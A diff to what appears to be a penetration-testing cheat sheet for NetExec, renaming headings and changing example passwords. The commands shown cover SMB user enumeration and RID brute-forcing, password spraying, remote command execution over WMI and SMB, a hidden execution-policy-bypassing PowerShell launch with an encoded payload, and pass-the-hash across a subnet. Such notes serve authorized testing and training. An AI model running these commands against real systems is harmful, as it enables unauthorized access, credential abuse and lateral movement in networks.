@@ -1,6 +1,6 @@
 # Methodology
 
-## Enumeration
+## Enumerate
 
 ```bash
 # Null authentication
@@ -27,16 +27,16 @@ nxc smb $IP -u 'a' -p '' --rid-brute 10000
 nxc smb $IP -u users.txt -p users.txt --continue-on-success
 ```
 
-## Obtained Credentials
+## Utilize Credentials
 
 ```bash
 # Check credentials (default to smb)
-nxc smb $IP -u username -p 'Password123!'
+nxc smb $IP -u username -p 'password'
 
 # Execute commands (default to wmi, then smb)
-nxc wmi $IP -u username -p 'Password123!' -x whoami
-nxc smb $IP -u username -p 'Password123!' -x whoami
-nxc smb $IP -u username -p 'Password123!' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'
+nxc wmi $IP -u username -p 'password' -x whoami
+nxc smb $IP -u username -p 'password' -x whoami
+nxc smb $IP -u username -p 'password' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'
 
 # Pass a NetNTLMv2 hash
 nxc smb 192.168.1.0/24 -u username -H 'NTHASH'
